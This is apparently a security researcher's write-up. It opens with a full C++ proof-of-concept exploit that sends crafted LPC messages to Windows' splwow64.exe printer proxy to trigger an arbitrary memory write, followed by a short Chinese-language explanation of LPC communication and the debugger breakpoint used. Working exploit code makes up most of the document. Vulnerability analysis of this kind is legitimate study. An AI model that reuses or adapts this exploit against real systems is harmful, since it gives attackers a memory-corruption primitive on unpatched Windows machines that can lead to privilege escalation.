
```c++
#include <iostream>;
#include "windows.h";
#include "Shlwapi.h";
#include "winternl.h";
typedef struct \_PORT\_VIEW
{
UINT64 Length;
HANDLE SectionHandle;
UINT64 SectionOffset;
UINT64 ViewSize;
UCHAR\* ViewBase;
UCHAR\* ViewRemoteBase;
} PORT\_VIEW, \* PPORT\_VIEW;
PORT\_VIEW ClientView;
typedef struct \_PORT\_MESSAGE\_HEADER {
USHORT DataSize;
USHORT MessageSize;
USHORT MessageType;
USHORT VirtualRangesOffset;
CLIENT\_ID ClientId;
UINT64 MessageId;
UINT64 SectionSize;
} PORT\_MESSAGE\_HEADER, \* PPORT\_MESSAGE\_HEADER;
typedef struct \_PORT\_MESSAGE {
PORT\_MESSAGE\_HEADER MessageHeader;
UINT64 MsgSendLen;
UINT64 PtrMsgSend;
UINT64 MsgReplyLen;
UINT64 PtrMsgReply;
UCHAR Unk4[0x1F8];
} PORT\_MESSAGE, \* PPORT\_MESSAGE;
PORT\_MESSAGE LpcRequest;
PORT\_MESSAGE LpcReply;
NTSTATUS(NTAPI\* NtOpenProcessToken)(
\_In\_ HANDLE ProcessHandle,
\_In\_ ACCESS\_MASK DesiredAccess,
\_Out\_ PHANDLE TokenHandle
);
NTSTATUS(NTAPI\* ZwQueryInformationToken)(
\_In\_ HANDLE TokenHandle,
\_In\_ TOKEN\_INFORMATION\_CLASS TokenInformationClass,
\_Out\_writes\_bytes\_to\_opt\_(TokenInformationLength, \*ReturnLength) PVOID TokenInformation,
\_In\_ ULONG TokenInformationLength,
\_Out\_ PULONG ReturnLength
);
NTSTATUS(NTAPI\* NtCreateSection)(
PHANDLE SectionHandle,
ACCESS\_MASK DesiredAccess,
POBJECT\_ATTRIBUTES ObjectAttributes,
PLARGE\_INTEGER MaximumSize,
ULONG SectionPageProtection,
ULONG AllocationAttributes,
HANDLE FileHandle
);
NTSTATUS(NTAPI\* ZwSecureConnectPort)(
\_Out\_ PHANDLE PortHandle,
\_In\_ PUNICODE\_STRING PortName,
\_In\_ PSECURITY\_QUALITY\_OF\_SERVICE SecurityQos,
\_Inout\_opt\_ PPORT\_VIEW ClientView,
\_In\_opt\_ PSID Sid,
\_Inout\_opt\_ PVOID ServerView,
\_Out\_opt\_ PULONG MaxMessageLength,
\_Inout\_opt\_ PVOID ConnectionInformation,
\_Inout\_opt\_ PULONG ConnectionInformationLength
);
NTSTATUS(NTAPI\* NtRequestWaitReplyPort)(
IN HANDLE PortHandle,
IN PPORT\_MESSAGE LpcRequest,
OUT PPORT\_MESSAGE LpcReply
);
int Init()
{
HMODULE ntdll = GetModuleHandleA("ntdll");
NtOpenProcessToken = (NTSTATUS(NTAPI\*) (HANDLE, ACCESS\_MASK, PHANDLE)) GetProcAddress(ntdll, "NtOpenProcessToken");
if (NtOpenProcessToken == NULL)
{
return 0;
}
ZwQueryInformationToken = (NTSTATUS(NTAPI\*) (HANDLE, TOKEN\_INFORMATION\_CLASS, PVOID, ULONG, PULONG)) GetProcAddress(ntdll, "ZwQueryInformationToken");
if (ZwQueryInformationToken == NULL)
{
return 0;
}
NtCreateSection = (NTSTATUS(NTAPI\*) (PHANDLE, ACCESS\_MASK, POBJECT\_ATTRIBUTES, PLARGE\_INTEGER, ULONG, ULONG, HANDLE)) GetProcAddress(ntdll, "NtCreateSection");
if (NtCreateSection == NULL)
{
return 0;
}
ZwSecureConnectPort = (NTSTATUS(NTAPI\*) (PHANDLE, PUNICODE\_STRING, PSECURITY\_QUALITY\_OF\_SERVICE, PPORT\_VIEW, PSID, PVOID, PULONG, PVOID, PULONG)) GetProcAddress(ntdll, "ZwSecureConnectPort");
if (ZwSecureConnectPort == NULL)
{
return 0;
}
NtRequestWaitReplyPort = (NTSTATUS(NTAPI\*) (HANDLE, PPORT\_MESSAGE, PPORT\_MESSAGE)) GetProcAddress(ntdll, "NtRequestWaitReplyPort");
if (NtRequestWaitReplyPort == NULL)
{
return 0;
}
return 1;
}
int GetPortName(PUNICODE\_STRING DestinationString)
{
void\* tokenHandle;
DWORD sessionId;
ULONG length;
int tokenInformation[16];
WCHAR dst[256];
memset(tokenInformation, 0, sizeof(tokenInformation));
ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
memset(dst, 0, sizeof(dst));
if (NtOpenProcessToken(GetCurrentProcess(), 0x20008u, &tokenHandle)
|| ZwQueryInformationToken(tokenHandle, TokenStatistics, tokenInformation, 0x38u, &length))
{
return 0;
}
wsprintfW(
dst,
L"\\RPC Control\\UmpdProxy\_%x\_%x\_%x\_%x",
sessionId,
tokenInformation[2],
tokenInformation[3],
0x2000);
printf("name: %ls\n", dst);
RtlInitUnicodeString(DestinationString, dst);
return 1;
}
HANDLE CreatePortSharedBuffer(PUNICODE\_STRING PortName)
{
HANDLE sectionHandle = 0;
HANDLE portHandle = 0;
union \_LARGE\_INTEGER maximumSize;
maximumSize.QuadPart = 0x20000;
if (0 != NtCreateSection(&sectionHandle, SECTION\_MAP\_WRITE | SECTION\_MAP\_READ, 0, &maximumSize, PAGE\_READWRITE, SEC\_COMMIT, NULL)) {
return 0;
}
if (sectionHandle)
{
ClientView.SectionHandle = sectionHandle;
ClientView.Length = 0x30;
ClientView.ViewSize = 0x9000;
int retval = ZwSecureConnectPort(&portHandle, PortName, NULL, &ClientView, NULL, NULL, NULL, NULL, NULL);
if(retval){
return 0;
}
}
return portHandle;
}
PVOID PrepareMessage()
{
memset(&LpcRequest, 0, sizeof(LpcRequest));
LpcRequest.MessageHeader.DataSize = 0x20;
LpcRequest.MessageHeader.MessageSize = 0x48;
LpcRequest.MsgSendLen = 0x88;
LpcRequest.PtrMsgSend = (UINT64)ClientView.ViewRemoteBase;
LpcRequest.MsgReplyLen = 0x10;
LpcRequest.PtrMsgReply = (UINT64)ClientView.ViewRemoteBase + 0x88;
memcpy(&LpcReply, &LpcRequest, sizeof(LpcRequest));
\*(UINT64\*)ClientView.ViewBase = 0x6D00000000; //Msg Type (Document Event)
\*((UINT64\*)ClientView.ViewBase + 3) = (UINT64)ClientView.ViewRemoteBase + 0x100; //First arg to FindPrinterHandle
\*((UINT64\*)ClientView.ViewBase + 4) = 0x500000005; // 2nd arg to FindPrinterHandle
\*((UINT64\*)ClientView.ViewBase + 7) = 0x2000000001; //iEsc argument to DocumentEvent
\*((UINT64\*)ClientView.ViewBase + 0xA) = (UINT64)ClientView.ViewRemoteBase + 0x800; //Buffer out to DocumentEvent, pointer to pointer of src of memcpy
\*((UINT64\*)ClientView.ViewBase + 0xB) = (UINT64)ClientView.ViewRemoteBase + 0x840; //Destination of memcpy
\*((UINT64\*)ClientView.ViewBase + 0x28) = (UINT64)ClientView.ViewRemoteBase + 0x160;
\*((UINT64\*)ClientView.ViewBase + 0x2D) = 0x500000005;
\*((UINT64\*)ClientView.ViewBase + 0x2E) = (UINT64)ClientView.ViewRemoteBase + 0x200;
\*((UINT64\*)ClientView.ViewBase + 0x40) = 0x6767;
\*((UINT64\*)ClientView.ViewBase + 0x100) = (UINT64)ClientView.ViewRemoteBase + 0x810;
return ClientView.ViewBase;
}
void DebugWrite()
{
printf("Copy from 0x%llX to 0x%llX (0x%llX bytes)\n", \*((UINT64\*)ClientView.ViewBase + 0x100), \*((UINT64\*)ClientView.ViewBase + 0xB), \*((UINT64\*)ClientView.ViewBase + 0x10A) >> 48);
}
bool WriteData(HANDLE portHandle, UINT64 offset, UCHAR\* buf, UINT64 size)
{
\*((UINT64\*)ClientView.ViewBase + 0xB) = offset;
\*((UINT64\*)ClientView.ViewBase + 0x10A) = size << 48;
memcpy(ClientView.ViewBase + 0x810, buf, size);
DebugWrite();
return NtRequestWaitReplyPort(portHandle, &LpcRequest, &LpcReply) == 0;
}
int main()
{
Init();
CHAR Path[0x100];
GetCurrentDirectoryA(sizeof(Path), Path);
PathAppendA(Path, "CreateDC.exe");
if (!(PathFileExistsA(Path)))
{
return 0;
}
WinExec(Path, 0);
CreateDCW(L"Microsoft XPS Document Writer", L"Microsoft XPS Document Writer", NULL, NULL);
UNICODE\_STRING portName;
if (!GetPortName(&portName))
{
return 0;
}
HANDLE portHandle = CreatePortSharedBuffer(&portName);
if (!(portHandle && ClientView.ViewBase && ClientView.ViewRemoteBase))
{
return 0;
}
PrepareMessage();
printf("Press [Enter] to continue . . .");
fflush(stdout);
getchar();
UINT64 value = 0;
if (!WriteData(portHandle, 0x4141414141414141, (UCHAR\*)&value, 8))
{
return 0;
}
printf("Done\n");
return 0;
}
```

## POC分析

一个简单的LPC通信，有以下几个步骤：

1. Server指定一个端口名，并创建端口
2. Server监听创建的端口
3. Client连接Server创建的端口
4. Server接受Client连接请求并完成连接
5. Client发送请求报文，并等待Server响应
6. Server接受请求报文并响应

在LPC通信过程中，如果报文较大，通信双方就会采用共享内存区的方式交换数据，但会通过报文进行协调同步。

LPC通信流程如下图所示（图片源自 @iamelli0t 师傅在看雪SDC的演讲PPT）

<img src="https://gitee.com/tianxuan-securitylab/source/raw/master/img/1623401452747.png" alt="1623401452747" style="zoom: 50%;" />

更多LPC相关内容，请自行查阅，本文不做详述。

目前已知的是通过`NtRequestWaitReplyPort`发送LPC消息到`splwow64.exe`进程后，由`splwow64!TLPCMgr::ProcessRequest`对LPC消息进行处理，所以对`splwow64!TLPCMgr::ProcessRequest`下断。
